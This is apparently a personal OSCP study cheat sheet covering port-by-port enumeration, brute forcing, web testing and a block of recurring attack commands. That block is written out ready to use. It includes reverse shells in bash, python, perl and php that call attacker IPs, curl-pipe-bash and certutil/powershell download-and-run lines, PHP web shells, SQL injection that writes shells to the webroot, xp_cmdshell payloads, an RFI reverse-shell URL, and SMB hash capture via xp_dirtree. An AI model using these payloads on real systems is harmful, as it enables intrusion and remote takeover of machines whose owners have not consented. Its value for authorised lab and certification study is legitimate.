# olga@ovm:~$ notes

### 👋 About These Notes

Built this during my OSCP preparation as a quick-access system for enumeration: one page that pulls together the most common checks, commands, and tactics I used to move faster and stay organized in labs and exam.

Each toggle links to internal Notion notes with deeper techniques (explained in [this guide](https://owlga.medium.com/notion-global-tag-database-streamline-your-cybersecurity-studies-d0ca1e5c39d4)).

Click **Duplicate** in the top right to copy to your space.

<aside>
⚠️

 This page includes **no spoilers, walkthroughs or OffSec content**. Just publicly available knowledge and personal notes compiled during my own OSCP prep.

</aside>

<aside>
▶️

Click the toggles to reveal port-specific checklists and commands. 

</aside>

- Recurring commands
    - Extensions
        
        ```bash
        txt,php,aspx,cgi,asp,html,jsp,pdf,doc,docx,xls,xlsx,rtf,bak,xml,xsl,phpthml,sh,pl,py,config,php7,exe
        
        ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml','.py','.cgi','.jsp','.pdf','.doc','.docx','.xls','.xlsx','.xsl','.rtf','.phphtml','.sh','.pl','.config','.php7','.exe' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$RHOST/FUZZ -r
        
        feroxbuster -u http://$RHOST/ -x htm php html js txt zip bak asp aspx xml py cgi jsp pdf doc docx xls xlsx xsl rtf phphtml sh pl config php7 exe -r -o 80-ferox.txt -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 100
        
        #phpext.txt 
        .php
        .php3
        .php4
        .php5
        .phtml
        
        #Web Extensions
        sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
        ```
        
        [andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
        
        Various *nix tools built as statically-linked binaries
        
    
    These are the commands I kept reaching for across countless OSCP-style labs. Recon, getting a shell, privesc, this is the muscle memory layer of the playbook.
    
    > ⚠️ Adapt these to your own lab or environment. Some IPs or paths are placeholders from my own notes.
    > 
    
    ## Kali 🐲
    
    ```bash
    python2 -m pip install -U impacket
    #URL encode with jq
    ┌──(kali㉿kali)-[~/Techblog]
    └─$ jq -rn --arg x 'http://$RHOST/Readme&cmd=bash -i >& /dev/tcp/$LHOST/443 0>&1' '$x|@uri'
    ```
    
    ## Enum. 🕷️
    
    ```bash
    sudo nmap -sV -Pn $RHOST
    sudo rustscan -a $RHOST -- -A -sC
    sudo nmap -p- --min-rate 5000 -T4 <ip address>
    nmap -sU 
    nmap -sV -sC #on the ports found.
    curl -i -s http://$RHOST | html2text
    # start off with /usr/share/dirb/wordlists/common.txt
    # /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    # for windows - /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
    # /usr/share/dirb/wordlists/big.txt
    ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml','.py','.log','.json','.old' -w ~/onelistforallshort.txt -u http://$RHOST:8080/oscommerce-2.3.4/FUZZ
    feroxbuster -u http://$RHOST/ -x htm php html js txt zip bak asp aspx xml py -r -o 80-ferox.txt -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 100
    gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u http://$RHOST/svn
    ```
    
    ## Shells 🐚
    
    ```bash
    <?php system($_REQUEST['cmd']); ?>
    <?php echo system($_REQUEST["o"]);?>
    <?php echo shell_exec($_GET['o']); ?>
    curl -X POST http://$RHOST/api/Login --data 'login:admin' -H "Content-Type: application/json"
    curl -s -i -X POST -H 'Content-Length: 0' http://$RHOST/list-running-procs
    curl "http://$RHOST/cmd.php?cmd=certutil+-f+-urlcache+http://$LHOST/reverse.exe+reverse.exe"
    curl "http://$RHOST/cmd.php?cmd=reverse.exe"
    curl http://$RHOST/svn/dev/users/views.py -u "admin:admin" --output views.py
    curl --user offsec:elite $RHOST/pwn.php
    **#WINDOWS**
    msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
    powershell iex(new-object system.net.webclient).downloadstring('http://$LHOST/pn.ps1')
    certutil -urlcache -split -f [http://](http://172.16.1.1/shell.exe)$LHOST[/](http://172.16.1.1/shell.exe)shell.exe & shell.exe
    **#LINUXP**
    #!/bin/bash
    bash -c 'bash -i >&/dev/tcp/$LHOST/8080 0>&1'
    wget http://$LHOST/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell
    wget${IFS}http://$LHOST/mini.php
    curl $LHOST/bashling|bash
    curl -s http://$RHOST/cmd.php --data "cmd=wget http://$LHOST/shell -O /tmp/shell" 
    nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s$LHOST${IFS}9999
    which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh
    #RFI
    http://$RHOST/Readme&cmd=bash -i >& /dev/tcp/$LHOST/443 0>&1
    http%3A%2F%2F172.16.1.1%2FReadme%26cmd%3Dbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.16.1.1%2F443%200%3E%261
    curl http://$RHOST/action=/inc/config.php?basePath=http://$LHOST/diablo%00 --data "cmd=echo $(base64 -w0 /home/kali/Admin/redacted/shellz)>/tmp/shell;base64 -d /tmp/shell >/tmp/shell2;base64 -d /tmp/shell2 > /tmp/shell3;bash /tmp/shell3"
    #MSF
    sudo msfconsole -q -x "use exploit/multi/handler;\
    > set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
    > set LHOST tun0;\
    > set LPORT 443;\
    > run"
    ```
    
    ## Esc. 🦅
    
    ```bash
    script -qc /bin/bash /dev/null
    #Upgrade shell
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    SHELL=/bin/bash script -q /dev/null
    Ctrl-Z
    stty raw - echo ;fg
    fg
    reset
    xterm
    export TERM=xterm
    export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    ```
    
    ```bash
    #!/bin/bash
    bash -c 'bash -i >& /dev/tcp/192.168.49.146/22 0>&1'
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.146",65000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
    perl -e 'use Socket;$i="192.168.49.146";$p=8082;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    php -r '$sock=fsockopen("192.168.49.146",25);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```
    
    ## SQL 🦖
    
    ```bash
    #connect via sqsh setting a config
    sqsh -S Meathead
    # SQL beyond credential extraction
    union select "1",(select '<?php echo system($_REQUEST["cmd"]); ?>'),"3","4","5","6","7","8" INTO OUTFILE '/var/www/html/cmd.php'-- -
    ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
    # ASCII Hex encode to prevent breaking the line; /etc/passwd = 2f6574632f706173737764 
    odm_user UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3,4,5,6,7,8,9
    # generate a new password [https://phppasswordhash.com/](https://phppasswordhash.com/) 
    MySQL [osclass]> update oc_t_admin set s_password=('$2y$10$4aIRqwdwz3BuV2xzZ789zeYHsD8kQWp9Oip/T10g1Oge8D89kCW2i') where s_username='admin';
    MySQL [osclass]> select "<?php system('wget $LHOST/shell -O /tmp/shell;chmod 777 /tmp/shell;/tmp/shell'); ?>" into outfile '/tmp/shell.php';
    #For windows 
    SQL> xp_cmdshell "powershell iex(new-object system.net.webclient).downloadstring("""http://$LHOST/1n.ps1""")"
    #if not enabled
    select IS_SRVROLEMEMBER ('sysadmin')
    enable_xp_cmdshell
    #If I can’t execute commands using xp_cmdshell I can steal hashes of the SQL service account by using xp_dirtree or xp_fileexist.
    # check out more in HTB Querier
    exec xp_dirtree '\\$LHOST\share\file'
    exec xp_fileexist '\\$LHOST\share\file'
    ```
    
    ```bash
    ssh -o StrictHostKeyChecking=no tom@$RHOST
    #get files from max
    scp -i id_rsa -rp /home/max/ max@$RHOST:/home/max
    #send keys to max
    scp -i id_rsa /home/max/authorized_keys max@$RHOST:/home/max/.ssh
    #ssh port forward
    [commander@nukem .vnc]$ 
    ssh> -L 5901:127.0.0.1:5901
    kali@kali:~$ sudo ssh -L 80:192.168.120.209:80 ariah@192.168.120.209
    ```
    

# Enumeration

## Ports

- A quick enum checklist for possible attack vectors through the most common ports.
    - **TCP**
        - **21 - FTP**
            
            @21-FTP 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### Checks
            
            - [ ]  Check if you have anonymous access
            - [ ]  Check if you can upload a file to trigger a webshell through the web app
            - [ ]  Check if you can download backup files to extract included passwords
            - [ ]  Check the version of FTP for exploits
            
            ### Commands
            
            > To view the content of a file in ftp: `ftp> get some_file.txt -`
            > 
            
            Login to ftp server (for anonymous access, use "`anonymous`":"`anonymous`"): `ftp $ip`.
            
            FTP-specific Nmap scan:
            
            ```bash
            nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip
            ```
            
            Download Everything:
            
            ```bash
            wget -m ftp://anonymous:anonymous@<ip>
            mget *
            ```
            
            Uploading:
            
            ```bash
            locate cmd.aspx #if iis
            put cmd.aspx
            #browse to the file:
            http://IP/cmd.aspx
            
            #we can also try to create a shell payload with msfvenum and upload it
            ```
            
        - **22 - SSH**
            
            @22-SSH 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Try easy username-password combinations
            - [ ]  Check for username enumeration vulnerabilities
            - [ ]  Check version for vulnerabilities
            - [ ]  (Only when getting desperate) Try brute force with Hydra, Medusa
            
            ### **Commands**
            
            Nmap scan:
            
            ```bash
            nmap -p 22000 -sV -Pn -T4 --script=ssh* $ip
            ```
            
            Brute force:
            
            ```bash
            hydra -v  -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 $ip ssh
            hydra -l gibson -P /tmp/alpha.txt -T 20 $ip ssh
            ```
            
            Connect through found key:
            
            ```bash
            #make key only accessible by the current user
            chmod 0600 private.key
            ssh user@$ip -i user.key
            ```
            
            Downloading/uploading files:
            
            ```bash
            scp username@hostname:/path/to/remote/file /path/to/local/file
            ```
            
            If NMAP show "SSH Filtered" it means that [port knocking](https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/) is enabled:
            
            ```bash
            #we need to find the /etc/knockd.conf (thorough LFI or FTP or something else)
            #inside there is a sequence
            knock IP SEQUENCE1 SEQUENCE2 SEQUENCE3
            #check nmap again
            ```
            
        - **25 - SMTP**
            
            @25,465,587 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### Checks
            
            - [ ]  Check for user enumeration
            - [ ]  Check version for exploits
            
            ### Commands
            
            Nmap scan:
            
            ```bash
            nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
            ```
            
            User enumeration:
            
            ```bash
            #manual way
            nc -nvv $ip 25
            telnet $ip 25
            VRFY root
            		(exists if user is replied as "250 Georgia<Georgia@>")
            		(doesn't exist if user is replied as "551 user not local")
            #automated way
            smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
            
            use auxiliary/scanner/smtp/smtp_enum
            msf auxiliary(smtp_enum) > set rhosts 192.168.1.107
            msf auxiliary(smtp_enum) > set rport 25
            msf auxiliary(smtp_enum) > set USER_FILE /root/Desktop/user.txt
            msf auxiliary(smtp_enum) > exploitw
            ```
            
        - **53 - DNS**
            
            @53-DNS 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ```bash
            #DNS zone transfer
            sudo nano /etc/hosts
            10.10.10.123  friendzone.red 
            host -l friendzone.red 10.10.10.123
            ```
            
        - **110 - POP3**
            
            @110,995-POP 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Check version for exploits
            - [ ]  Check mails for the presence of credentials
            
            ### **Commands**
            
            manually login to the application:
            
            ```bash
            #connect and check for banner
            telnet $ip 110
            #guess login credentials
            USER pelle
            PASS admin
            #list all emails
            list
            #retrieve email number 5 for example
            retr 5
            ```
            
            Nmap Enum Script:
            
            ```bash
            sudo nmap --script pop3-capabilities,pop3-ntlm-info -p110 <RHOST>
            ```
            
            Bruteforce:
            
            ```bash
            sudo nmap --script pop3-brute -p110 <RHOST> auxiliary/scanner/pop3/pop3_login
            ```
            
        - **111 - NFS/RPC**
            
            @111/TCP/UDP-Portmapper 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### Checks
            
            - [ ]  Check for passwords in files on mountable drives
            
            ### Commands
            
            ```bash
            #check general rpc info
            rpcinfo $ip
            #Check what shares you can mount
            showmount -e $ip
            #mounting the share
              #make the directory
              mkdir /mnt/share
              #mount the share
              mount -t nfs $ip:/share /mnt/share -nolock
            
            rpcclient -U "" $ip
                srvinfo
                enumdomusers
                getdompwinfo
                querydominfo
                netshareenum
                netshareenumall
            ```
            
            <aside>
            🔑 Keep mountable shares in mind as they might be used in root squashing attacks to elevate your privileges to root.
            
            </aside>
            
        - **135 - MSRPC**
            
            @135,593-MSRPC 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            Nmap Scan`sudo nmap -n -sV -Pn -p 135 --script=msrpc-enum <RHOST>`
            
            MSF Enum
            
            ```
            use auxiliary/scanner/dcerpc/endpoint_mapper
            use auxiliary/scanner/dcerpc/hidden
            use auxiliary/scanner/dcerpc/management
            use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
            ```
            
            RPC Dump`/usr/bin/impacket-rpcdump <RHOST> -p 135`
            
            ```bash
            rpcclient --user="" --command=enumprivs -N $ip #Connect to an RPC share without a username and password and enumerate privledges
            rpcclient --user="<Username>" --command=enumprivs $ip #Connect to an RPC share with a username and enumerate privledges
            ```
            
        - **139/445 - SMB**
            
            @139,445-SMB 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Check for null sessions
            - [ ]  Check the permissions of users you already have
            - [ ]  Check for passwords in files
            - [ ]  Attempt brute force on enumerated users
            - [ ]  Check for EternalBlue
            - [ ]  Check samba version (if Linux)
            
            ### **Commands (Automated)**
            
            Nmap scan:
            
            ```bash
            #general scan
            nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse $ip -p 445
            #vulnerability scan
            sudo nmap --script smb-vuln* -p 139,445 -oA nmap_smb_vulns $ip
            ```
            
            Check samba versions:
            
            ```bash
            #save code below as samba_version.sh and make it executable
            ./samba_version.sh
            
            if [ -z $1 ]; then echo "Usage: ./samba_version.sh RHOST {RPORT}" && exit; else rhost=$1; fi
            if [ ! -z $2 ]; then rport=$2; else rport=139; fi
            tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$$"
            echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
            sleep 0.5 && echo ""
            ```
            
            `enum4linux`:
            
            ```bash
            enum4linux -a $ip
            ```
            
            `smbmap`:
            
            ```bash
            #list general folders
            smbmap -H $ip
            #recursively list dirs and files
            smbmap -r $sharename -H $ip
            smbmap -R "Users" -H $ip -u Guest
            #download a file
            smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q
            ```
            
            Dump Info
            
            ```bash
            rpcclient -U "" <RHOST>
            ```
            
            Download files
            
            ```bash
            #Search a file and download
            sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
            smbget -R smb://<ip>/anonymous
            ```
            
            ```bash
            #Download all
            smbclient //<IP>/<share>
            > mask ""
            > recurse
            > prompt
            > mget *
            #Download everything to current directory
            ```
            
            ```bash
            smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
            net use \\TARGET\IPC$ "" /u:"" #Manual Null session testing
            ```
            
            `CrackMapExec`:
            
            ```bash
            #check if you can connect through null sessions (check what rights you have on the shares)
            		cme smb $ip -u '' -p '' --shares
            		cme smb $ip -u '' -p '' --shares --port 139
            
            #enumerate the users
            		#rid brute forcing
            		cme smb $ip -u "" -p "" --rid-brute
            		#active sessions
            		cme smb $ip -u '' -p '' --loggedon-users
            		#users in general
            		cme smb $ip -u '' -p '' --users
            #enumerate the groups
            		#local groups
            		cme smb $ip -u '' -p '' --local-groups
            		#domain groups
            		cme smb $ip -u '' -p '' --groups
            #check for the password policy
            		cme smb $ip -u "" -p "" --pass-pol
            ```
            
            Mount shares and inspect files manually:
            
            ```bash
            #smbclient
            smbclient -L $ip
            smbclient //$ip/tmp
            smbclient \\\\192.168.1.105\\ipc$ -U john
            smbclient //$ip/ipc$ -U john
            #mounting the share
            mkdir /mnt/targetshare
            mount -t cifs \\172.16.20.88\ipc$ -o username=[username] /mnt/targetshare
            ```
            
            Brute force smb:
            
            ```bash
            hydra -l Administrator -P /usr/share/seclists/Passwords/darkweb2017-top100.txt $ip smb -V -f
            #in OSCP the passwords are often equal to the username
            hydra -L usernames.txt -P usernames.txt $ip smb -V -f
            ```
            
            Gaining shell through `psexec` (user needs to be admin):
            
            ```bash
            #copy script
            cp /usr/share/doc/python-impacket/examples/psexec.py .
            #specific command test
            python psexec.py <username>:<pass>@10.11.xx.xx whoami
            #shell
            rlwrap python psexec.py  <username>:<pass>@10.11.xx.xx
            #NOTE: be carefull with exclamation marks in passwords:  rottenadmin:P@ssword123\!@192.168.194.140
            #through crackmapexec (didn't always work for me)
            cme smb 10.11.xx.xx -u "backup" -p "backup" -x whoami
            ```
            
        - **1433 - MSSQL**
            
            @1433-MSSQL 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Try default credentials "`sa`:`password`"
            - [ ]  Brute force creds
            - [ ]  Check database content for new passwords
            - [ ]  Check version for exploits
            - [ ]  RCE
                - [ ]  through `xp_cmdshell` functionality
                - [ ]  through injecting payload in output file, placing it in webroot and triggering it through webapp
            
            ### **Commands**
            
            Nmap:
            
            ```bash
            nmap -p 1433 --script='banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' $ip -o 1433_nmap_mssql
            nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
            ```
            
            Credential brute force:
            
            ```bash
            nmap -p 1433 --script ms-sql-brute --script-args passdb=/usr/share/seclists/Passwords/darkweb2017-top1000.txt $ip
            nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt $ip
            ```
            
            Manually logging in and gaining shell:
            
            ```bash
            #login
            sqsh -S $ip -U sa -P password
            sqsh -S $ip:27900 -U sa -P password
            #execute commands
            xp_cmdshell 'date'
            go
            ```
            
        - **3306 - MySQL**
            
            @3306-MySQL 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Try default credentials "root":""
            - [ ]  Brute force credentials
            - [ ]  Check database content for new passwords
            - [ ]  Check version for exploits
            
            ### **Commands**
            
            Nmap:
            
            ```bash
            nmap -sV -Pn --script=mysql-audit.nse,mysql-brute.nse,mysql-databases.nse,mysql-dump-hashes.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-query.nse,mysql-users.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse -p 3306 -o 3306_nmap_mysql $ip
            ```
            
            Try default password:
            
            ```bash
            mysql --host=$ip -u root -p
            ```
            
        - **3389 - RDP**
            
            @3389-RDP 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Check if you can login with default guest account and blank password
            - [ ]  Check if you can brute force users
            - [ ]  Check for BlueKeep
            
            ### **Commands**
            
            Nmap:
            
            ```bash
            nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 $ip -o 3389_nmap_rdp
            ```
            
            Manually login:
            
            ```bash
            rdesktop $ip
            #Try default guest account "guest":""
            rdesktop -u guest $ip -g 94%
            ```
            
            Start brute force:
            
            ```bash
            ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
            ncrack -vv --user Administrator -P /usr/share/seclists/Passwords/darkweb2017-top100.txt rdp://$ip
            ```
            
        - **5900 - VNC**
            
            @5800,5801,5900,5901-VNC 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  check for easy VNC passwords
            - [ ]  check for exploits for VNC version
            - [ ]  brute force VNC password
            
            ### **Commands**
            
            Nmap:
            
            ```bash
            nmap -sV -Pn -p 5900 --script=vnc-info,vnc-title,realvnc-auth-bypass $ip -oA 5900_nmap_VNC
            ```
            
            VNC brute force on base password:
            
            ```bash
            hydra -s 5900 -P /usr/share/seclists/Passwords/darkweb2017-top10.txt -t 30 $ip vnc
            ```
            
    - **UDP**
        - **53 - DNS**
            
            @53-DNS 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Try zone transfer
            - [ ]  Brute force subdomains
            
            ### **Commands**
            
            Do DNS lookup specifying the DNS server:
            
            ```bash
            nslookup
            #set nameserver to ip of box
            >  server 10.10.10.13
            #ask for dns of box ip address
            >  10.10.10.13
            ```
            
            Subdomain enumeration / brute force:
            
            ```bash
            dig axfr @$ip test.htb
            fierce -dns ext.recon.lan -dnsserver 172.16.90.53
            gobuster dns -d ext.recon.lan -r 172.16.90.53 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
            ```
            
        - **69 - TFTP**
            
            @69-UDP TFTP 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Search for files to find sensitive info like passwords
            - [ ]  Upload shells to trigger them in web app
            
            ### **Commands**
            
            Nmap:
            
            ```
            nmap -sU -p 69 --script tftp-enum.nse $ip
            ```
            
            Interact with TFTP protocol:
            
            ```bash
            #setup the connection
            tftp 172.16.200.100
            #get a file
            tftp> get /etc/passwd
            #upload reverse shell
            tftp> put shell.php
            ```
            
            Automated search sensitive files (`Metasploit`):
            
            ```bash
            msfconsole
            use tftpbrute
            set dictionary /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
            ```
            
        - **161 - SNMP**
            
            @161,162,10161,10162/UDP-SNMP 📎 This section links to my private notes — similar structure to HackTricks, but customized.
            
            ### **Checks**
            
            - [ ]  Try the default community strings 'public' and 'private'
            - [ ]  Enumerate version of OS/users/processes
            
            ### **Commands**
            
            Nmap:
            
            ```bash
            nmap -sU -p161 --script "snmp-*" $ip
            nmap -sT -p 161 $ip -oG snmp_results.txt
            nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat $ip
            ```
            
            Scan range of IP addresses for SNMP strings:
            
            ```bash
            #only try "public" and "private"
            onesixtyone -i targets.list
            #try 100+ community strings
            onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip
            onesixtyone -c names -i hosts
            ```
            
            enumerate information with known community string:
            
            ```bash
            # enumerate windows users
            snmpwalk -c public -v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25
            # enumerates running processes
            snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2
            snmpwalk -Os -c public -v2c 192.168.97.42
            
            snmpwalk -c public -v1 192.168.1.X 1| 
             grep hrSWRunName|cut -d* * -f
            
            snmpcheck -t 192.168.1.X -c public
            ```
            
            Fix SNMP output values so they are human readable:
            
            ```bash
            apt-get install snmp-mibs-downloader download-mibs
            echo "" > /etc/snmp/snmp.conf
            ```
            

## Web

- **80/443 - HTTP(S)**
    
    Also this: https://github.com/OWASP/wstg/blob/master/checklists/checklist.md
    
    @80,443-Web 📎 This section links to my private notes — similar structure to HackTricks, but customized.
    
    @Web Tools 📎 This section links to my private notes — similar structure to HackTricks, but customized.
    
    ### **Checks**
    
    - [ ]  Login portals (More in '**Login portals'** below**)**
        - [ ]  Try the default credentials off the application
            - [ ]  Admin / admin
            - [ ]  Administrator / administrator
            - [ ]  root
            - [ ]  CMS Name
            - [ ]  Repeat user as pass (`pandabear`:`pandabear`)
            - [ ]  Username + CMS (ex: username: `administratorjoomla`, password: `cactiuser`)
            - [ ]  Repeat one of the above 2 times (ex: username: `adminadmin`, password: `adminadmin`)
            - [ ]  Repeat one of the above 3 times (ex: username: `adminadminadmin`, password: `cacticacticacti`)
            - [ ]  Repeat one of the above + numbers (ex: username: `admin123`, password: `cacti123`)
            - [ ]  CMS + user (ex: `cactiuser` or `usercacti`)
            - [ ]  try admin:`cmsname123`
        - [ ]  Try usernames already seen throughout the application or in other services like SMTP
        - [ ]  Try SQL injection bypasses `1' or 1 = 1-- -` (Check in '**Login portals'** below**)**
        - [ ]  Try registering a new user
        - [ ]  Brute force with hydra, medusa
    - [ ]  Check `robots.txt` for hidden directories
    - [ ]  Brute force directories to find hidden content
    - [ ]  Check for passwords/URLs/versions/ in the source (things like comments of web app, Developer Remarks, passwords or any weird code)
    - [ ]  Check version numbers for known exploits
        - [ ]  Check changelog for version information
        - [ ]  Estimate version based on copyright date (if not automatically adjusted)
    - [ ]  Check if specific CMS is used like WordPress and then use platform-specific scanners
    - [ ]  Ways to RCE:
        - [ ]  Check for file upload functionalities (if uploads are filtered, try alternative extensions)
        - [ ]  Execute commands through SQLi
        - [ ]  Shellshock
        - [ ]  Command injection
        - [ ]  Trigger injected code through path traversal
    - **Enumeration scans**
        
        Directory brute force:
        
        ```bash
        #start of with general scan
        gobuster dir -u $ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 50
        #add extensions
        gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -f -t 30 -x php,txt,cgi,sh,pl,py -s "200,204,301,302,307,403,500" -u $ip
        ```
        
        Nmap scan:
        
        ```bash
        nmap -sV -Pn --script=ssl-heartbleed,http-adobe-coldfusion-apsa1301.nse,http-apache-negotiation.nse,http-apache-server-status.nse,http-aspnet-debug.nse,http-auth-finder.nse,http-auth.nse,http-avaya-ipoffice-users.nse,http-awstatstotals-exec.nse,http-axis2-dir-traversal.nse,http-backup-finder.nse,http-barracuda-dir-traversal.nse,http-bigip-cookie.nse,http-brute.nse,http-cakephp-version.nse,http-cisco-anyconnect.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-cookie-flags.nse,http-cors.nse,http-cross-domain-policy.nse,http-csrf.nse,http-date.nse,http-default-accounts.nse,http-devframework.nse,http-dlink-backdoor.nse,http-dombased-xss.nse,http-domino-enum-passwords.nse,http-drupal-enum-users.nse,http-drupal-enum.nse,http-enum.nse,http-errors.nse,http-exif-spider.nse,http-feed.nse,http-fileupload-exploiter.nse,http-form-brute.nse,http-form-fuzzer.nse,http-frontpage-login.nse,http-git.nse,http-gitweb-projects-enum.nse,http-headers.nse,http-huawei-hg5xx-vuln.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-internal-ip-disclosure.nse,http-joomla-brute.nse,http-jsonp-detection.nse,http-litespeed-sourcecode-download.nse,http-ls.nse,http-majordomo2-dir-traversal.nse,http-mcmp.nse,http-method-tamper.nse,http-methods.nse,http-mobileversion-checker.nse,http-ntlm-info.nse,http-open-redirect.nse,http-passwd.nse,http-php-version.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-proxy-brute.nse,http-put.nse,http-qnap-nas-info.nse,http-rfi-spider.nse,http-robots.txt.nse,http-security-headers.nse,http-server-header.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-svn-enum.nse,http-svn-info.nse,http-title.nse,http-tplink-dir-traversal.nse,http-trace.nse,http-traceroute.nse,http-trane-info.nse,http-unsafe-output-escaping.nse,http-useragent-tester.nse,http-userdir-enum.nse,http-vhosts.nse,http-vlcstreamer-ls.nse,http-vmware-path-vuln.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-vuln-cve2017-1001000.nse,http-vuln-cve2017-5638.nse,http-vuln-cve2017-5689.nse,http-vuln-cve2017-8917.nse,http-vuln-misfortune-cookie.nse,http-vuln-wnr1000-creds.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-brute.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse -p 80 $ip
        ```
        
        Webdav scanning:
